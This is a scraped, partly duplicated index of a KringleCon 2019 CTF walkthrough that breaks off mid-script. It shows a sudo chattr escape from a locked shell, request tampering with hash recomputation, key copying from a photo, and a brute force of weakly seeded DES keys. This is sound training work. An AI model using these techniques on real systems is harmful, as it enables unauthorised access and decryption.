daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin elf:x:1000:1000::/home/elf:/bin/bash alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh so we need to change this shell /bin/nsh to normal user shell. check which commands you can run as root sudo -l Matching Defaults entries for elf on 3bd3621ef6cc: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User elf may run the following commands on 3bd3621ef6cc: (root) NOPASSWD: /usr/bin/chattr So we can run chattr command. But which file do we need to use it on? chattr is a command line Linux utility that is used to set/unset certain attributes to a file in Linux system to secure accidental deletion or modification of important files and folders, even though you are logged in as a root user. 1 Let's find other clues , check the root directory: cd / ls You will find interesting file entrypoint.sh , read the content: cat entrypoint.sh #!/bin/bash chmod +x /bin/nsh chattr +i /bin/nsh echo \"export RESOURCE_ID= $RESOURCE_ID \" >> /home/alabaster_snowball/.bashrc echo \"/home/alabaster_snowball/success\" >> /home/alabaster_snowball/.bashrc su - elf So the file /bin/nsh is made immutable by chattr command with +i flag Verify the immutable status of the files using \u2018lsattr\u2018 command: lsattr /bin/nsh ----i---------e---- /bin/nsh remove immutable bit from the file sudo -u root chattr -i /bin/nsh Let\u2019s verify the attribute: lsattr /bin/nsh --------------e---- /bin/nsh Now we can overwrite the file content, let's replace it with normal shell cat /bin/bash > /bin/nsh try to log in now as the user alabaster_snowball with a password of Password2 : su alabaster_snowball You have completed the Nyanshell challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Alabaster Snowball Who would do such a thing?? Well, it IS a good looking cat. Have you heard about the Frido Sleigh contest? There are some serious prizes up for grabs. The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter. I heard there was a talk at KCII about using machine learning to defeat challenges like this. I don't think anything could ever beat an elf though! \ud83c\udf93 What you've learned \u00b6 Using chattr , lsattr , sudo -l command Checking users shell from /etc/passwd . https://www.tecmint.com/chattr-command-examples/ https://www.geeksforgeeks.org/chattr-command-in-linux-with-examples/ \u21a9","title":"Nyanshell"},{"location":"helptheelves/challenge6/#nyanshell","text":"\ud83d\udccd The Speaker UNpreparedness Room \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Alabaster Snowball Welcome to the Speaker UNpreparedness Room! My name's Alabaster Snowball and I could use a hand. I'm trying to log into this terminal, but something's gone horribly wrong. Every time I try to log in, I get accosted with ... a hatted cat and a toaster pastry? I thought my shell was Bash, not flying feline. When I try to overwrite it with something else, I get permission errors. Have you heard any chatter about immutable files ? And what is sudo -l telling me? Chatter? sudo -l says I can run a command as root. What does it do? User's Shells On Linux, a user's shell is determined by the contents of /etc/passwd . Log in as the user alabaster_snowball with a password of Password2 , and land in a Bash prompt","title":"\ud83c\udfae Nyanshell"},{"location":"helptheelves/challenge6/#solution","text":"When You open the Cranberry Pi terminal, You see: if you try to login using the credentials provided: su alabaster_snowball You will get nyancat! Let's check user's shell by reading the /etc/passwd file: cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin elf:x:1000:1000::/home/elf:/bin/bash alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh so we need to change this shell /bin/nsh to normal user shell. check which commands you can run as root sudo -l Matching Defaults entries for elf on 3bd3621ef6cc: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User elf may run the following commands on 3bd3621ef6cc: (root) NOPASSWD: /usr/bin/chattr So we can run chattr command. But which file do we need to use it on? chattr is a command line Linux utility that is used to set/unset certain attributes to a file in Linux system to secure accidental deletion or modification of important files and folders, even though you are logged in as a root user. 1 Let's find other clues , check the root directory: cd / ls You will find interesting file entrypoint.sh , read the content: cat entrypoint.sh #!/bin/bash chmod +x /bin/nsh chattr +i /bin/nsh echo \"export RESOURCE_ID= $RESOURCE_ID \" >> /home/alabaster_snowball/.bashrc echo \"/home/alabaster_snowball/success\" >> /home/alabaster_snowball/.bashrc su - elf So the file /bin/nsh is made immutable by chattr command with +i flag Verify the immutable status of the files using \u2018lsattr\u2018 command: lsattr /bin/nsh ----i---------e---- /bin/nsh remove immutable bit from the file sudo -u root chattr -i /bin/nsh Let\u2019s verify the attribute: lsattr /bin/nsh --------------e---- /bin/nsh Now we can overwrite the file content, let's replace it with normal shell cat /bin/bash > /bin/nsh try to log in now as the user alabaster_snowball with a password of Password2 : su alabaster_snowball You have completed the Nyanshell challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Alabaster Snowball Who would do such a thing?? Well, it IS a good looking cat. Have you heard about the Frido Sleigh contest? There are some serious prizes up for grabs. The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter. I heard there was a talk at KCII about using machine learning to defeat challenges like this. I don't think anything could ever beat an elf though!","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge6/#what-youve-learned","text":"Using chattr , lsattr , sudo -l command Checking users shell from /etc/passwd . https://www.tecmint.com/chattr-command-examples/ https://www.geeksforgeeks.org/chattr-command-in-linux-with-examples/ \u21a9","title":"\ud83c\udf93 What you've learned"},{"location":"helptheelves/challenge7/","text":"\ud83c\udfae Frosty Keypad \u00b6 \ud83d\udccd The Quad \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Tangle Coalbox Hey kid, it's me, Tangle Coalbox. I'm sleuthing again, and I could use your help. Ya see, this here number lock's been popped by someone. I think I know who, but it'd sure be great if you could open this up for me. I've got a few clues for you: One digit is repeated once. The code is a prime number. You can probably tell by looking at the keypad which buttons are used. Frosty Keypad One digit is repeated once, it's prime, and you can see which keys were used. Get the correct key to open the door \u26a1\ufe0f Solution \u00b6 When You open the Keypad, You see: Given the hints, after looking at the keypad you can tell which buttons are used: 1, 3, 7 . Also by the code must be 4 digits as One digit of the three is repeated once. To we need get all possible combinations and check each code if it is a prim or not. Hint A prime number is a natural number greater than 1 that cannot be formed by multiplying two smaller natural numbers. 1 We can use a small python code to help us: import itertools # All numbers from the keypad and repeat the prime 3, 7 numbers = [ 1 , 3 , 7 , 3 , 7 ] #Create all Possible Combinations allnum = [] for item in itertools . permutations ( numbers , 4 ): num = '' . join ([ str ( i ) for i in item ]) num = int ( num ) if num not in allnum : allnum . append ( num ) print ( \"Possible Combinations\" , allnum ) # Check for Possible code by prime check allprim = [] for num in allnum : for i in range ( 2 , num // 2 ): if ( num % i ) == 0 : break else : print ( num , \"is a prime number\" ) allprim . append ( num ) print ( \"Possible code:\" , allprim ) So we have 5 possible codes 1373 , 1733 , 3137 , 3371 , 7331 . Try each code. The keypad code 7331 You have completed the Frosty Keypad challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Tangle Coalbox Yep, that's it. Thanks for the assist, gumshoe. Hey, if you think you can help with another problem, Prof. Banas could use a hand too. Head west to the other side of the quad into Hermey Hall and find him in the Laboratory. https://www.youtube.com/watch?v=9pgA-H77BLc \u21a9","title":"Frosty Keypad"},{"location":"helptheelves/challenge7/#frosty-keypad","text":"\ud83d\udccd The Quad \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Tangle Coalbox Hey kid, it's me, Tangle Coalbox. I'm sleuthing again, and I could use your help. Ya see, this here number lock's been popped by someone. I think I know who, but it'd sure be great if you could open this up for me. I've got a few clues for you: One digit is repeated once. The code is a prime number. You can probably tell by looking at the keypad which buttons are used. Frosty Keypad One digit is repeated once, it's prime, and you can see which keys were used. Get the correct key to open the door","title":"\ud83c\udfae Frosty Keypad"},{"location":"helptheelves/challenge7/#solution","text":"When You open the Keypad, You see: Given the hints, after looking at the keypad you can tell which buttons are used: 1, 3, 7 . Also by the code must be 4 digits as One digit of the three is repeated once. To we need get all possible combinations and check each code if it is a prim or not. Hint A prime number is a natural number greater than 1 that cannot be formed by multiplying two smaller natural numbers. 1 We can use a small python code to help us: import itertools # All numbers from the keypad and repeat the prime 3, 7 numbers = [ 1 , 3 , 7 , 3 , 7 ] #Create all Possible Combinations allnum = [] for item in itertools . permutations ( numbers , 4 ): num = '' . join ([ str ( i ) for i in item ]) num = int ( num ) if num not in allnum : allnum . append ( num ) print ( \"Possible Combinations\" , allnum ) # Check for Possible code by prime check allprim = [] for num in allnum : for i in range ( 2 , num // 2 ): if ( num % i ) == 0 : break else : print ( num , \"is a prime number\" ) allprim . append ( num ) print ( \"Possible code:\" , allprim ) So we have 5 possible codes 1373 , 1733 , 3137 , 3371 , 7331 . Try each code. The keypad code 7331 You have completed the Frosty Keypad challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Tangle Coalbox Yep, that's it. Thanks for the assist, gumshoe. Hey, if you think you can help with another problem, Prof. Banas could use a hand too. Head west to the other side of the quad into Hermey Hall and find him in the Laboratory. https://www.youtube.com/watch?v=9pgA-H77BLc \u21a9","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge8/","text":"\ud83c\udfae Holiday Hack trail \u00b6 \ud83d\udccd The Dorm \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Minty Candycane Hi! I'm Minty Candycane! I just LOVE this old game! I found it on a 5 \u00bc\" floppy in the attic. You should give it a go! If you get stuck at all, check out this year's talks. One is about web application penetration testing. Good luck, and don't get dysentery! Web App Pen Testing Web Apps: A Trailhead Play the game! \u26a1\ufe0f Solution \u00b6 When You open the game, You see: Easy mode \u00b6 You will notice that the url is holding all the parameters, so the game using get http request to send the parameters I the next page (after click buy ) our target is the distance 8000 : Let's change the distance parameter in the url to 8000 as following: hhc://trail.hhc/trail/?difficulty=0&distance=8000&money=5000&pace=0&curmonth=7&curday=1&reindeer=2&runners=2&ammo=100&meds=20&food=400&name0=Mathias&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Ruth&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Ruth&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=Mathias&health3=100&cond3=0&causeofdeath3=&deathday3=0&deathmonth3=0 Then click Go to Win! Your party has succeeded! Medium mode \u00b6 The parameters no longer sent in the url. Let's check if it's sent using post http request: Open Developer tools in your browser and Select Network tab. Start the game again and monitor the requests. Once you clicked on buy you will see a request made to /trail/ with the parameters. Click on the request on the left panel then select Params on the right panel to check distance parameter. Let's open burp suite application to get a nice view and easy edit Start the game and Select Medium mode. On the store page, go to Burp app and make sure the proxy is on to intercept the requests. Click Buy and go to Burp app and select Proxy > Intercept > Params: Edit the distance parameter then FORWARD the request: You can stop the intercept proxy now and Click Go to Win! Your party has succeeded! Hard mode \u00b6 Here also the parameters no longer sent in the url. Let's check the request on Burp app after we click buy : You will notice the request now include new parameter called hash - as hinted in the Talk. bc573864331a9e42e4511de6f678aa83 We need figure how the hash is calculated to regenerate it after editing. If we searched for the hash in any hashes database online ex. hashes.org , You will find : It's Hashed using MD5 algorithm and this hash bc573864331a9e42e4511de6f678aa83 at the game beginning it's cracked to 1626 at distance 0 . by testing different values during the game progeress, You will find that it's sum of the game parameters then hashing the total. For example at starting point 0 the paramter are the following: reindeer runners ammo meds food money distance curmonth curday 2 2 10 2 100 1500 0 9 1 The sum of all values is 1626 which hashed to bc573864331a9e42e4511de6f678aa83 using md5. Hints from the talk From the talk there is a leak from back-end and we can see the how the hash generated. So we need intercept the request after buy phase and change the distance parameter to 8000 and recalculate the hash by adding the distance value to the 1626 : > You can use hashes.org to generate the hash. 9626 : 649d45bf179296e31731adfd4df25588 Intercept the request after buy phase and change the distance and hash then Forward the request: Your party has succeeded! You have completed the Holiday Hack Trail challenges! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 GET , Post requests. How to intercept, edit, Forward the request. Hash usage and calculation.","title":"Holiday Hack trail"},{"location":"helptheelves/challenge8/#holiday-hack-trail","text":"\ud83d\udccd The Dorm \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Minty Candycane Hi! I'm Minty Candycane! I just LOVE this old game! I found it on a 5 \u00bc\" floppy in the attic. You should give it a go! If you get stuck at all, check out this year's talks. One is about web application penetration testing. Good luck, and don't get dysentery! Web App Pen Testing Web Apps: A Trailhead Play the game!","title":"\ud83c\udfae Holiday Hack trail"},{"location":"helptheelves/challenge8/#solution","text":"When You open the game, You see:","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge8/#easy-mode","text":"You will notice that the url is holding all the parameters, so the game using get http request to send the parameters I the next page (after click buy ) our target is the distance 8000 : Let's change the distance parameter in the url to 8000 as following: hhc://trail.hhc/trail/?difficulty=0&distance=8000&money=5000&pace=0&curmonth=7&curday=1&reindeer=2&runners=2&ammo=100&meds=20&food=400&name0=Mathias&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Ruth&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Ruth&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=Mathias&health3=100&cond3=0&causeofdeath3=&deathday3=0&deathmonth3=0 Then click Go to Win! Your party has succeeded!","title":"Easy mode"},{"location":"helptheelves/challenge8/#medium-mode","text":"The parameters no longer sent in the url. Let's check if it's sent using post http request: Open Developer tools in your browser and Select Network tab. Start the game again and monitor the requests. Once you clicked on buy you will see a request made to /trail/ with the parameters. Click on the request on the left panel then select Params on the right panel to check distance parameter. Let's open burp suite application to get a nice view and easy edit Start the game and Select Medium mode. On the store page, go to Burp app and make sure the proxy is on to intercept the requests. Click Buy and go to Burp app and select Proxy > Intercept > Params: Edit the distance parameter then FORWARD the request: You can stop the intercept proxy now and Click Go to Win! Your party has succeeded!","title":"Medium mode"},{"location":"helptheelves/challenge8/#hard-mode","text":"Here also the parameters no longer sent in the url. Let's check the request on Burp app after we click buy : You will notice the request now include new parameter called hash - as hinted in the Talk. bc573864331a9e42e4511de6f678aa83 We need figure how the hash is calculated to regenerate it after editing. If we searched for the hash in any hashes database online ex. hashes.org , You will find : It's Hashed using MD5 algorithm and this hash bc573864331a9e42e4511de6f678aa83 at the game beginning it's cracked to 1626 at distance 0 . by testing different values during the game progeress, You will find that it's sum of the game parameters then hashing the total. For example at starting point 0 the paramter are the following: reindeer runners ammo meds food money distance curmonth curday 2 2 10 2 100 1500 0 9 1 The sum of all values is 1626 which hashed to bc573864331a9e42e4511de6f678aa83 using md5. Hints from the talk From the talk there is a leak from back-end and we can see the how the hash generated. So we need intercept the request after buy phase and change the distance parameter to 8000 and recalculate the hash by adding the distance value to the 1626 : > You can use hashes.org to generate the hash. 9626 : 649d45bf179296e31731adfd4df25588 Intercept the request after buy phase and change the distance and hash then Forward the request: Your party has succeeded! You have completed the Holiday Hack Trail challenges! \ud83c\udf89","title":"Hard mode"},{"location":"helptheelves/challenge8/#what-youve-learned","text":"GET , Post requests. How to intercept, edit, Forward the request. Hash usage and calculation.","title":"\ud83c\udf93 What you've learned"},{"location":"helptheelves/challenge9/","text":"\ud83c\udfae Get Access To The Steam Tunnels \u00b6 \ud83d\udccd Minty's room in the dorm \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Minty Candycane You made it - congrats! Have you played with the key grinder in my room? Check it out! It turns out: if you have a good image of a key, you can physically copy it. Maybe you'll see someone hopping around with a key here on campus. Sometimes you can find it in the Network tab of the browser console. Deviant has a great talk on it at this year's Con. He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale. Watch | Key Bitting Optical Decoding of Keys | Deviant Ollam While many individuals understand the need to safeguard their keys from strangers, this caution typically comes in the form of unwillingness to physically hand them to maintenance staff, valet drivers, or someone who \"just needs to open a door and then bring the keys right back.\" However, do you know that equal caution is merited when it comes to people seeing your keys? Believe it or not, but it is possible to use a photograph of a key to reverse-engineer out the bitting data... a series of numbers that can be used to produce a copy, even if you never have the source key in your physical possession. This mini talk will step you through the process... live. Bitting Templates Deviant's Key Decoding Templates Find the key and enter the tunnel! \u26a1\ufe0f Solution \u00b6 Open network tab in Browser Developer tools. Go to Minty's room, Don't run behind him you can't catch him! Check the Network tab for his image and Save the image After looking at his image you will find his key ! Get the bitting template thats match the key from Deviant's Key Decoding Templates key type > Schlage Calculate the key bitting : key bitting values: 122520 Generate the key using Key maching and save it: bzzzzz...dooone! Go to the tunnel lock and use the key : Congratulations! You have completed the Get Access To The Steam Tunnels challenge! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 Key bitting. Access elements on Network tab.","title":"Key Bitting"},{"location":"helptheelves/challenge9/#get-access-to-the-steam-tunnels","text":"\ud83d\udccd Minty's room in the dorm \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Minty Candycane You made it - congrats! Have you played with the key grinder in my room? Check it out! It turns out: if you have a good image of a key, you can physically copy it. Maybe you'll see someone hopping around with a key here on campus. Sometimes you can find it in the Network tab of the browser console. Deviant has a great talk on it at this year's Con. He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale. Watch | Key Bitting Optical Decoding of Keys | Deviant Ollam While many individuals understand the need to safeguard their keys from strangers, this caution typically comes in the form of unwillingness to physically hand them to maintenance staff, valet drivers, or someone who \"just needs to open a door and then bring the keys right back.\" However, do you know that equal caution is merited when it comes to people seeing your keys? Believe it or not, but it is possible to use a photograph of a key to reverse-engineer out the bitting data... a series of numbers that can be used to produce a copy, even if you never have the source key in your physical possession. This mini talk will step you through the process... live. Bitting Templates Deviant's Key Decoding Templates Find the key and enter the tunnel!","title":"\ud83c\udfae Get Access To The Steam Tunnels"},{"location":"helptheelves/challenge9/#solution","text":"Open network tab in Browser Developer tools. Go to Minty's room, Don't run behind him you can't catch him! Check the Network tab for his image and Save the image After looking at his image you will find his key ! Get the bitting template thats match the key from Deviant's Key Decoding Templates key type > Schlage Calculate the key bitting : key bitting values: 122520 Generate the key using Key maching and save it: bzzzzz...dooone! Go to the tunnel lock and use the key : Congratulations! You have completed the Get Access To The Steam Tunnels challenge! \ud83c\udf89","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge9/#what-youve-learned","text":"Key bitting. Access elements on Network tab.","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective0/","text":"0. Talk to Santa \ud83c\udf85 in the Quad \u00b6 Enter the campus quad and talk to Santa. \ud83c\udf85 Santa in the Quad This is a little embarrassing, but I need your help. Our KringleCon turtle dove mascots are missing! They probably just wandered off. Can you please help find them? To help you search for them and get acquainted with KringleCon, I\u2019ve created some objectives for you. You can see them in your badge. Where's your badge? Oh! It's that big, circle emblem on your chest - give it a tap! We made them in two flavors - one for our new guests, and one for those who've attended both KringleCons. After you find the Turtle Doves and complete objectives 2-5, please come back and let me know. Not sure where to start? Try hopping around campus and talking to some elves. If you help my elves with some quicker problems, they'll probably remember clues for the objectives.","title":"0 Talk to Santa in the Quad"},{"location":"objectives/objective0/#0-talk-to-santa-in-the-quad","text":"Enter the campus quad and talk to Santa. \ud83c\udf85 Santa in the Quad This is a little embarrassing, but I need your help. Our KringleCon turtle dove mascots are missing! They probably just wandered off. Can you please help find them? To help you search for them and get acquainted with KringleCon, I\u2019ve created some objectives for you. You can see them in your badge. Where's your badge? Oh! It's that big, circle emblem on your chest - give it a tap! We made them in two flavors - one for our new guests, and one for those who've attended both KringleCons. After you find the Turtle Doves and complete objectives 2-5, please come back and let me know. Not sure where to start? Try hopping around campus and talking to some elves. If you help my elves with some quicker problems, they'll probably remember clues for the objectives.","title":"0. Talk to Santa \ud83c\udf85 in the Quad"},{"location":"objectives/objective1/","text":"1. Find the Turtle \ud83d\udd4a Doves \ud83d\udd4a \u00b6 Find the missing turtle doves. \u26a1\ufe0f Solution \u00b6 Watch | Welcome to KringleCon 2: Turtle Doves Watch Welcome to KringleCon 2: Turtle Doves Ed Skoudis presents a welcome to KringleCon with tips on how to use your badge, solve objectives, and get hints through terminal challenges. Also, he talks about the missing Turtle Doves and how YOU can help solve that crisis. From the talk we get the hint \"Stay Worm!\" . Walk around the campus you will find Michael and Jane (the missing turtle doves) at the fireplace in the student union. Thank you for finding our two turtle doves! \ud83c\udf89","title":"1 Find the Turtle Doves"},{"location":"objectives/objective1/#1-find-the-turtle-doves","text":"Find the missing turtle doves.","title":"1. Find the Turtle \ud83d\udd4a Doves \ud83d\udd4a"},{"location":"objectives/objective1/#solution","text":"Watch | Welcome to KringleCon 2: Turtle Doves Watch Welcome to KringleCon 2: Turtle Doves Ed Skoudis presents a welcome to KringleCon with tips on how to use your badge, solve objectives, and get hints through terminal challenges. Also, he talks about the missing Turtle Doves and how YOU can help solve that crisis. From the talk we get the hint \"Stay Worm!\" . Walk around the campus you will find Michael and Jane (the missing turtle doves) at the fireplace in the student union. Thank you for finding our two turtle doves! \ud83c\udf89","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective10/","text":"10. Recover Cleartext Document \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83d\udcdc Info & Hints \u00b6 Recover Cleartext Document The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have debug symbols that you can use. Recover the plaintext content for this encrypted document . We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. What is the middle line on the cover page? (Hint: it's five words) For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen. Watch> Reverse Engineering https://youtu.be/obJdpKDpFBA What is the middle line on the cover page? \u26a1\ufe0f Solution \u00b6 Download the files: Elfscrow Crypto debug symbols encrypted document Understanding the application: \u00b6 The executable is a windows program, You will need to test it on windows machine. Testing on Linux machine You can use wine package to test the executable on Linux machine. sudo apt-get install wine-stable For more info go to https://www.winehq.org/ Running the executable: .\\ elfscrow . exe Welcome to ElfScrow V1.01, the only encryption trusted by Santa! * WARNING: You're reading from stdin. That only partially works, use at your own risk! ** Please pick --encrypt or --decrypt! Are you encrypting a file? Try --encrypt! For example: elfscrow.exe --encrypt <infile> <outfile> You'll be given a secret ID. Keep it safe! The only way to get the file back is to use that secret ID to decrypt it, like this: elfscrow.exe --decrypt --id=<secret_id> <infile> <outfile> You can optionally pass --insecure to use unencrypted HTTP. But if you do that, you'll be vulnerable to packet sniffers such as Wireshark that could potentially snoop on your traffic to figure out what's going on! So we have --insecure to use unencrypted HTTP .. interesting. Encryption: Try to encrypt a test text file with the elfscrow tool to see how it works. .\\ elfscrow . exe - -encrypt unencrypted . txt encrypted . txt . enc The app created a Seed which is look like a timestamp 1578688947 . Try to change it to human readable text and it will give your the time you run the app. Generated an encryption key e8ecf939324a688e with length of 8 bytes using the seed. Sent the key encryption key to https://elfscrow.elfu.org/api/store Returned a1bc0ffb-2a49-42f4-9427-575ccb17dfdb which is a unique uuid by it's format. Decryption: Try to decrypt the file you just encrypted to see how it works. .\\ elfscrow . exe - -decrypt - -id =< secret_id > encrypted . txt . enc decrypted . txt Replace <secret_id> with id you got when encrypted the file. The app retrieve the key from: https://elfscrow.elfu.org/api/retrieve using secret_id . Then decrypted the file using the key. Monitoring the network connections: Now try to encrypt/decrypt the file with option --insecure to use unencrypted connection to the api, So we can monitor and analysis the traffic and verify our findings. Open Wireshark or similar apps to monitor the network traffic and start monitoring the traffic: Run Encryption command .\\ elfscrow . exe - -insecure - -encrypt unencrypted . txt encrypted . txt . enc Then follow HTTP stream to read the POST request headers and body The app send encryption key using POST request to the api The server respond with uuid Run Decryption command .\\ elfscrow . exe - -insecure - -decrypt - -id =< secret_id > encrypted . txt . enc decrypted . txt > Replace <secret_id> with id you got when encrypted the file. Then follow HTTP stream to read the POST request headers and body The app send uuid using POST request to the api The server respond with decryption key Let's try to send correct/wrong data to the api to check the errors: You can use apps like Postman , Insomnia to easily play with HTTP requests. Let's start with storing the key: send an empty POST request to the api https://elfscrow.elfu.org/api/store Invalid key must be 16 hex characters (8 bytes) If you send the correct key format you get the uuid Then try to retrieve the key : send an empty POST request to the api https://elfscrow.elfu.org/api/retrieve Bad identifier must be a UUID If you send the correct uuid format you get the key Debug the application: \u00b6 In order to decrypt the file we either we have the uuid which is unique and randomly generated to get the key from the api. or regenerate the key and decrypt the file. For this we need the following: seed which is time based and from the hint we know the time range December 6, 2019, between 7pm and 9pm UTC. Key generation function. Encryption function. Let's start with looking at the program binary to find how the key is generated and the file encryption process. 8 bytes Key A key with a fixed length - 7 or 8 bytes usually used fo DES You will need windows machine and debugging program like Ghidra or IDA Windows Virtual Machine You can grab a copy on a Windows 10 a virtual machine from here. https://developer.microsoft.com/en-us/windows/downloads/virtual-machines Open the binary in IDA And make sure to load debug information from .pdb file Select _main function from left panel and Switch to text view: You can scroll down and start reading to find the functions and debugging information. Also we can check functions directly from left panel, We have interesting functions: time super_secure_srand(int) super_secure_random(void) generate_key(uchar * const) do_encrypt(int,char *,char *) do_decrypt(int,char *,char *,char *) store_key(int,uchar * const) retrieve_key(int,uchar * const,char *) Let's start with generate_key function: It calls time and then time returns its return value in EAX then they use EDX as a parameter seed Then calls super_secure_srand(int) function with seed as input_std Do 8 loops for super_secure_random(void) with value from super_secure_srand and each loop it just getting one random byte Return the generated key. Immediately we see the key is based on time and is based on srand. 1 Check super_secure_srand function: We can lookup the function by searching it's name or from the talk void srand ( int x ) { seed = x ; } Check super_secure_random function: Convert the hex values to numeric: We can lookup the function by searching this values or from the talk int rand () { return seed = ( seed * 214013 + 2531011 ) & 32767 ; } Now we can easily generate the key. Check encryption function Get generated the key as mentioned Encrypt using DES-CBC algorithm which confirmed by the key length. Send the key to the api using store_key function Check decryption function Retrive the key from the api using retrieve_key function Decrypt using DES-CBC algorithm which confirmed by the key length. Decrypting the file \u00b6 We will use python to: Recreate the keys in the time frame December 6, 2019, between 7pm and 9pm UTC . Decrypt the file. Check if the file is not corrupted. Let's begin: Create our time converter to unix, set it as our seed : from datetime import datetime # December 6, 2019, between 7pm and 9pm UTC. start_time = '2019-12-06-19-00-00-+0000' end_time = '2019-12-06-21-00-01-+0000' def totimestamp ( t ): t = datetime . strptime ( t , '%Y-%m- %d -%H-%M-%S-%z' ) t = datetime . timestamp ( t ) return int ( t ) start_time = totimestamp ( start_time ) end_time = totimestamp ( end_time ) my_seed = start_time Generate the key def my_rand ( seed ): seed = ( seed * 214013 + 2531011 ) & RAND_MAX_32 return seed def make_key ( seed , size ): key = '' for f in range ( size ): seed = my_rand ( seed ) f_seed = ( seed >> 16 ) & 0xFF f_seed = \" %02x \" % f_seed key += f_seed return key Decryption function from Crypto.Cipher import DES # Decrypt def decrypt ( ciphertext , key ): iv = b ' ' * 8 cipher = DES . new ( key , DES . MODE_CBC , iv ) plaintext = cipher . decrypt ( ciphertext ) return plaintext We set iv to 0 as it's not specified. Check if the file is PDF or not by searching for pdf at the file beginning: # check if pdf def check_pdf ( fin ): if b 'pdf' in fin [: 1000 ]: return True Decrypt and check the file is PDF then save it: def decrypt_file ( ciphertext , key , outfile ): dec = decrypt ( ciphertext , key ) if check_pdf ( dec ): with open ( outfile , 'wb' ) as outt : outt . write ( dec ) print ( '******' , outfile , ' is PDF ' , '****** \\n ' + 'Decrypted with key' , f_key , 'and key seed' , my_seed , ' \\n ' 'Creation time: ' , datetime . utcfromtimestamp ( my_seed ) ) exit () 6. With the encrypted file open, Run the script and loop through timestamp range: with open ( in_file , 'rb' ) as inn : cipher_text = inn . read () i = 1 while my_seed < end_time : f_key = make_key ( my_seed , DES_KEY_SIZE ) print ( i , ' |' , datetime . utcfromtimestamp ( my_seed ) ' | Seed:' , my_seed , '| Key:' , f_key ) my_seed += 1 i += 1 out_file = f_key + '_' + in_file [: - 4 ] ikey = bytes . fromhex ( f_key ) decrypt_file ( cipher_text , ikey , out_file ) So the 